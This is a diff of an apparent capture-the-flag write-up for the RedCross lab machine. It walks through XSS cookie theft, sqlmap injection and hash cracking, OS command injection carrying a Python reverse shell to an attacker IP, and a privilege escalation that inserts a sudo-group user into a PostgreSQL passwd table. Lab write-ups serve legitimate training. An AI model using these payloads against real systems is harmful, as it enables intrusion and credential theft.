@@ -13,7 +13,7 @@ Let's get straight into it!
 
 A quick top 10000 TCP port scan reveals the following ports as open:
 
-```bash
+```c {hl_lines=[1]}
 $ nmap 10.10.10.113
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-14 13:51 AEDT
 Nmap scan report for intra.redcross.htb (10.10.10.113)
@@ -28,7 +28,7 @@ PORT    STATE SERVICE
 As we have a HTTPS server running, we can use sslscan to extract any domain
 names used in the ssl certificate:
 
-```bash
+```c {hl_lines=[1]}
 $ sslscan 10.10.10.113
 Version: 1.11.12-static
 OpenSSL 1.0.2-chacha (1.0.2g-dev)
@@ -79,7 +79,7 @@ doesn't complain.
 
 After a few seconds, we see a cookie sent to us from the RedCross machine!
 
-```bash
+```c {hl_lines=[1]}
 $ python -m SimpleHTTPServer 8081
 Serving HTTP on 0.0.0.0 port 8081 ...
 10.10.10.113 - - [12/Nov/2018 00:05:08] "GET /?c=PHPSESSID=b01tmdbt5sea98jcf7ojmchpq5;%20LANG=EN_US;%20SINCE=1541941507;%20LIMIT=10;%20DOMAIN=admin HTTP/1.1" 200 -
@@ -109,7 +109,7 @@ following page: `https://intra.redcross.htb/?o=1&page=app`
 OK so now we know that there is an SQL query being performed, and the database
 is likely to be MariaDB. Let's setup a request for `SQLMap`:
 
-```bash
+```c {hl_lines=[1]}
 $ cat sqlquery2
 GET /?o=1&page=app HTTP/1.1
 Host: intra.redcross.htb
@@ -125,7 +125,7 @@ Upgrade-Insecure-Requests: 1
 Running `SQLMap` with this request tells us that we have found SQL injection!
 Specifically, we find it using the `o` parameter:
 
-```bash
+```c {hl_lines=[1]}
 $ sqlmap -r sqlquery2 -p o
 GET parameter 'o' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
 sqlmap identified the following injection point(s) with a total of 372 HTTP(s) requests:
@@ -151,7 +151,7 @@ database server does not have rights to write a file on the server. So we look
 for sensitive data in the database instead. We find that the main database is
 called `redcross`, and it has a table named `users`. We dump this table as follows:
 
-```bash
+```c {hl_lines=[1]}
 $ sqlmap -r sqlquery2 -D redcross -T users --dump
 +----+------+------------------------------+----------+--------------------------------------------------------------+
 | id | role | mail                         | username | password                                                     |
@@ -166,7 +166,7 @@ $ sqlmap -r sqlquery2 -D redcross -T users --dump
 
 We then crack the hashes we find above as follows:
 
-```bash
+```c {hl_lines=[1]}
 $ john hashes --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8Loaded 5 password hashes with 5 different salts (bcrypt [Blowfish 32/64 X2])
 Press 'q' or Ctrl-C to abort, almost any other key for status
@@ -215,7 +215,7 @@ have administrative logins on both the `intra` and `admin` subdomains, our next
 option would be to test out whether these credentials work when logging in with
 SSH:
 
-```bash
+```c {hl_lines=[1,2,4,6]}
 $ ssh test@intra.redcross.htb
 $ id
 uid=2024 gid=1001(associates) groups=1001(associates)
@@ -235,7 +235,7 @@ we are able to read a world readable file named `ipctl.c` in the `/home/public/s
 folder. Looking inside this file, we see code that looks like it is used for
 adding and deleting `iptables` rules:
 
-```bash
+```c {hl_lines=[1]}
 $ cat iptctl.c
 /*
 Small utility to manage iptables, easily executable from admin.redcross.htb
@@ -292,7 +292,7 @@ functionality provided in the admin panel! Testing out the functionality
 provided to us on the firewall management page on admin.redcross.htb, we see the
 following request being sent to the server when adding a new IP:
 
-```
+```http
 POST /pages/actions.php HTTP/1.1
 Host: admin.redcross.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
@@ -316,7 +316,7 @@ vulnerability due to the arguments being passed into the `execvp` function.
 After some trial and error, I was able to get OS command injection working with
 the `ip` parameter and using an action of `deny`:
 
-```
+```http
 POST /pages/actions.php HTTP/1.1
 Host: admin.redcross.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
@@ -338,18 +338,18 @@ In the above OS command injection, we use `&&` to execute another command after 
 Now that we have OS command injection, we can try escalate to a proper reverse
 shell. The following is code for a python reverse shell where our attacker IP is `10.10.14.227`:
 
-```bash
+```c
 $ python -c 'importsocket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.227",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 ```
 
 HTML encoding the above and sending it in the POST request gave us a reverse
 shell:
 
-```
+```py
 ip=10.10.10.10+%26%26+python+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.10.14.227",1234))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call(["/bin/bash","-i"])%3b'&id=27&action=deny
 ```
 
-```bash
+```c {hl_lines=[1,6]}
 $ nc -nvlp 1234
 listening on [any] 1234 ...
 connect to [10.10.14.227] from (UNKNOWN) [10.10.10.113] 55922
@@ -364,7 +364,7 @@ find `/home/penelope/user.txt` exists, however I cannot open the file as it is
 owned by penelope and not world readable. Looking at other interesting files, I
 see a lot of passwords in the PHP files used for the admin panel:
 
-```bash
+```c {hl_lines=[1]}
 www-data@redcross:/var/www/html/admin/pages$ grep password * -Hn
 actions.php:32:	$sql=$mysqli->prepare("SELECT id, password, mail, role FROM users WHERE username = ?");
 actions.php:44:	if(password_verify($pass,$hash) and $role==0){
@@ -388,7 +388,7 @@ Wolverine's blog tells us that this can be achieved with a postgres plugin named
 configuration files: `/etc/nss-pgsql.conf` and `/etc/nss-pgsql-root.conf`. Looking
 for these files, we find that they do exist on our host!
 
-```bash
+```c {hl_lines=[1]}
 www-data@redcross:/etc$ ls -al nss-*
 -rw-rw---- 1 root root  540 Jun  8  2018 nss-pgsql-root.conf
 -rw-r--r-- 1 root root 1341 Jun  8  2018 nss-pgsql.conf
@@ -398,7 +398,7 @@ This pretty much confirms the use of the `libnss-pgsql2` plugin for managing uni
 users! Let's try looking inside the unix  database and see what we can find. We
 can use the `psql` client to talk with postgres. Additionally, from the `nss-pgsql.conf` file and Wolverine's blog, we note that there is a table in the database named `passwd_table`:
 
-```bash
+```c {hl_lines=[1,3]}
 www-data@redcross:/etc$ psql -h 127.0.0.1 -U unixusrmgr -d unix
 Password for user unixusrmgr: dheu%7wjx8B&
 SELECT * FROM passwd_table;
@@ -414,7 +414,7 @@ Interesting! We see our test  user exists in this table, and that it has a `home
 With the permissions of `unixusrmgr`, let's see if I can add a user to this table
 and give them a `uid` or `gid` of `0`:
 
-```
+```sql
 INSERT INTO passwd_table VALUES ('dev', '$1$xyz$cEUv8aN9ehjhMXG/kSFnM1', 2023, 0, '', '/', '/bin/bash');
 ERROR:  permission denied for relation passwd_table
 ```
@@ -427,22 +427,22 @@ the `sudo` group, which would give me the permissions to `sudo` to `root`.
 
 We find the ID of the `sudo` group as follows:
 
-```bash
+```c {hl_lines=[1]}
 www-data@redcross:/$ cat /etc/group | grep sudo
 sudo:x:27:
 ```
 
 Next, we can run the following query (after logging in to `psql` as `unixusrmgr`) to add a user with the `gid` of `27`:
 
-```
+```sql
 insert into passwd_table (username, passwd, gid, homedir) values ('dev', '$1$xyz$cEUv8aN9ehjhMXG/kSFnM1', 27, '/');
 INSERT 0 1
 ```
 
-Success! Note that I generated the passwd hash of the user using `penssl passwd
+Success! Note that I generated the passwd hash of the user using `openssl passwd
 -1 -salt xyz password`. Therefore, the above crypt hash is for the password of `password`. Now I can try SSH in as my new user:
 
-```bash
+```c {hl_lines=[1,5]}
 $ ssh dev@intra.redcross.htb
 dev@intra.redcross.htb's password:
 Linux redcross 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64
@@ -454,7 +454,7 @@ uid=2032(dev) gid=27(sudo) groups=27(sudo)
 Great! Looks like our user was successfully added and we are in the `sudo` group!
 Now we simply sudo su, enter the password of `password`, and get `root.txt`:
 
-```bash
+```c {hl_lines=[1,10,12]}
 dev@redcross:/$ sudo su
 
 We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things:
@@ -478,7 +478,7 @@ Looking around with our `www-data` shell, we also see a folder named `haraka` in
 penelope's home directory which stands out. Searching for processes with this
 name we find:
 
-```bash
+```c {hl_lines=[1]}
 www-data@redcross:/var/www/html/admin/pages$ ps aux | grep haraka
 penelope  1306  0.2  4.4 994300 45060 ?        Ssl  10:54   0:01 node /usr/bin/haraka -c /home/penelope/haraka
 www-data  5395  0.0  0.0  11112   916 ?        S    11:04   0:00 grep haraka
@@ -490,7 +490,7 @@ found out that haraka is actually a webmail / SMTP server. To confirm it's
 listening, we can try look at open ports on the host. Unfortunately, the host
 did not have `netstat`, but as it is debian, we have an alternative called ss:
 
-```bash
+```c {hl_lines=[1,3]}
 www-data@redcross:/var/www/html/admin/pages$ netstat -ntlp
 bash: netstat: command not found
 www-data@redcross:/var/www/html/admin/pages$ ss -ntlp
@@ -510,7 +510,7 @@ Interestingly, we don't see any server running on port 25, which is the default
 for Haraka and SMTP based services, but we do see that something is listening on
 port 1025. We `telnet` to this port to check it out:
 
-```bash
+```c {hl_lines=[1]}
 www-data@redcross:/var/www/html/admin/pages$ telnet 127.0.0.1 1025
 telnet 127.0.0.1 1025
 Trying 127.0.0.1...
@@ -523,7 +523,7 @@ Great! Looks like Haraka version 2.8.8 is running on this port!
 
 We also find an exploit for this version using searchsploit:
 
-```bash
+```c {hl_lines=[1]}
 $ searchsploit haraka 2.8.
 ----------------------------------------------------------------------------------
 Exploit Title                                     |  Path| (/usr/share/exploitdb/)
@@ -538,7 +538,7 @@ noted that the port of the server is specified in the script itself, so we need
 to change it from 25 to 1025. Then, we can use a simple python reverse shell
 with this exploit to get a shell as penelope. Simply download [rev.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python) and `haraka-exploit.py` onto the host and execute the following:
 
-```bash
+```c
 www-data@redcross:/var/www/html/admin/pages$ python haraka-exploit.py -c "python /tmp/rev.py" -t penelope@redcross.htb -m 127.0.0.1
 ```
 
@@ -546,7 +546,7 @@ And that's how we can get a shell as `penelope`!
 
 Moving on: let's say we have a scenario where we cannot add ourselves to the `sudo` group, but can add ourselves to the root  group. Here, an interesting scenario arises. Being in the `root` group means that we can read the secret `/etc/nss-pgsql-root.conf` file!
 
-```bash
+```c {hl_lines=[1]}
 dev@redcross:/etc$ cat nss-pgsql-root.conf
 shadowconnectionstring = hostaddr=127.0.0.1 dbname=unix user=unixnssroot password=30jdsklj4d_3 connect_timeout=1
 shadowbyname = SELECT username, passwd, date_part('day',lastchange - '01/01/1970'), min, max, warn, inact, expire, flag FROM shadow_table WHERE username = $1 ORDER BY lastchange DESC LIMIT 1;
@@ -562,8 +562,8 @@ Finally, I noticed the following python script in root's folder which was the
 script that actually opened a browser and executed the XSS payloads we send to
 the admin panel:
 
-```bash
-root@redcross:~/bin# cat redcrxss.py
+```py {hl_lines=[1]}
+root@redcross:~/bin$ cat redcrxss.py
 #!/usr/bin/python2.7
 <-----snip----->
 url="https://admin.redcross.htb/9a7d3e2c3ffb452b2e40784f77723938/573ba8e9bfd0abd3d69d8395db582a9e.php?"
